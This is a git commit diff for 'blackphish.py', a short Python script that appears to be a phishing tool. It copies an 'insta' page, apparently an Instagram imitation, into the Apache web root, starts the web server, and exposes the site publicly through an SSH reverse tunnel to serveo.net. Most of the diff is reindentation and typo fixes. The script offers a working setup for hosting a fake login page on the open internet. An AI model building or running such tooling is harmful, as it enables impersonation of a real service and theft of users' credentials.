0d2e93b4216b8918e0b42f4d4ea166d2f09e895f
inc0gnit0 <iinc0gnit0@pm.me>
2019-10-28 20:19:51 -0500

    Add files via upload

--- blackphish.py
+++ blackphish.py
@@ -1,47 +1,49 @@
 try:
-        import os
+    import os
+    #subproccess
         
 except ImportError():
-        print("Error importing")
-        exit(1)
+    print("Error importing")
+    exit(1)
 
 
 def install(): # Host webpage #
-        os.system('cp /usr/share/Blackphish/insta /var/www/html/')
-def servo_forward(): #Forwardinf to servo#
-                os.system('nohup ssh -R incognito:80:localhost:80 serveo.net &')
-                #subprocess.Popen(["rm","-r","some.file"])
+    os.system('cp /usr/share/Blackphish/insta /var/www/html/')
+def serveo_forward(): # Port forward to serveo#
+    os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
+    #subprocess.Popen(["rm","-r","some.file"])
 
 def main():  # Main script #
-        choice = input("[BlackPhish] -> ") # Get user input #
-        if choice == "1":
-                print('[*] Copying Files')
-                install()
-                print('[*] Startig Apache2 Service')
-                os.system('service apache2 start')
-                servo_forward()
-                print('[*] Forwarding Traffic to "https://incognito.serveo.net/"')
-                print('[*] Done')
-                #os.system('clear')
-                main()
-        #elif choice == "clean":
-            #os.system('service apache2 stop')
+    choice = input("[BlackPhish] -> ") # Get user input #
+    if choice == "1":
+        print('[*] Copying Files')
+        install()
+        print('[*] Starting Apache2 Service')
+        os.system('service apache2 start')
+        serveo_forward()
+        print('[*] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
+        print('[*] Done')
+        #os.system('clear')
+        main()
+
+    #elif choice == "clean":
+        #os.system('service apache2 stop')
             
-        elif choice == "":
-                main()
-        elif choice == "clear":
-            os.system('clear')
-            main()
-        #elif choice == "ls":
-            #os.system('ls')
-            #main()
-        #elif choice == "help"
-            #print('')
-        
+    elif choice == "":
+        main()
+
+    elif choice == "clear":
+        os.system('clear')
+        main()
+
+    #elif choice == "help"
+        #print('')
+    
 
 try: # This will start the script
-        if __name__ == '__main__':
-                main()
+    if __name__ == '__main__':
+        main()
+
 except KeyboardInterrupt(): # Will detect if they exit #
-        print("Exiting")
-        exit(0)
+    print("Exiting")
+    exit(0)
